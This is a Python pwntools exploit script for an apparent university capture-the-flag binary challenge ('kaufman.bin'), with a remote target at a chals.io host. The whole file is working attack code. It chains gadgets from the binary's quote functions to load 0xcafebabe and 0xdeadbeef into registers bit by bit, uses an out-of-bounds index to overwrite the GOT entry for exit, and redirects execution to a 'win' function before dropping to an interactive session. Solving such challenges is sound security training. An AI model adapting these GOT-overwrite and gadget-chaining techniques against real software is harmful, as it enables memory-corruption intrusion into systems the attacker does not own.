from pwn import *

binary = "./kaufman.bin"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break main
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    if args.REMOTE:
        return remote("cse4850-bin8.chals.io", 443, ssl=True, sni="cse4850-bin8.chals.io")
    return process(e.path)

p = start()

def set_rdi_to(value):
    # Used to set rdi bit by bit
    if value == 0:
        return b""
    payload = set_rdi_to(value >> 1) 
    payload += p64(e.symbols['quote3']+0xe)  # shl rdi, 1
    if value & 1 == 1:  # If bit is set
        payload += p64(e.symbols['quote6']+0xe)  # add rdi, 1
    return payload

log.info("Making jump table...")
jmp_tbl = p64(e.got['exit'])  # Used for overwriting got
jmp_tbl += p64(e.symbols['quote4']+0xe)  # xor rdi, rdi
jmp_tbl += set_rdi_to(0xcafebabe)
jmp_tbl += p64(e.symbols['quote1']+0xe)  # mov rsi, rdi
jmp_tbl += p64(e.symbols['quote4']+0xe)  # xor rdi, rdi
jmp_tbl += set_rdi_to(0xdeadbeef)
jmp_tbl += p64(e.symbols['win'])  # Jumps to win

p.sendlineafter(b">>>", jmp_tbl)  # Adds jump table to binary

log.info("Sending oob attack...")
offset = (e.sym['review'] - e.sym['review_names']) // 8
log.info(f"Got offset of {offset}")
p.sendlineafter(b">>>", str(offset).encode('utf-8'))  # Offset used to overwrite exit in got
p.sendlineafter(b">>>", p64(e.symbols['quote5']))  # Overwrite got with dispatch setup

p.interactive()
